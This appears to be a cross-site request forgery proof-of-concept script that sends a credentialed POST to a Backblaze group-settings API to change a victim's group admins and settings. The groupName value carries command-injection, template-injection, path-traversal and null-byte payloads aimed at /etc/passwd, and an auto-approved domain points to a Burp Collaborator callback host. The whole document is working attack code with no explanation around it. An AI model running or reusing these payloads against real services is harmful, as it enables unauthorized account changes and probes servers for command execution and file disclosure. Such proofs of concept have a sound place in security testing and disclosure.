function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/groupsapi.backblaze.com\/api2\/bz_groups_update_group_settings", true);
        xhr.setRequestHeader("Accept", "application\/json");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.withCredentials = true;
        var body = "{\"groupId\":\"81322\",\"changedByAccountId\":\"369bafd4096e\",\"groupAdmins\":[\"jheba+test@afine.com\",\"jheba+test2@afine.com\"],\"settingsChange\":{\"groupName\":\"$(whoami) `whoami`${5*5}${{6*6}}../../../../../../../../../../../../../../etc/passwd%00%0a%0did\",\"backupEnabled\":true,\"b2Enabled\":true,\"autoApprove\":false,\"autoApprovedDomains\":[\"lk959353gr0u1cyjv77n9gp1rsxil7.burpcollaborator.net\"],\"managedAsOf\":1588797819566,\"disableMemberEmails\":null,\"sendGroupStatsWithSummaryEmailToAdmins\":true,\"ssoEnabled\":false,\"groupSsoSettings\":null}}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
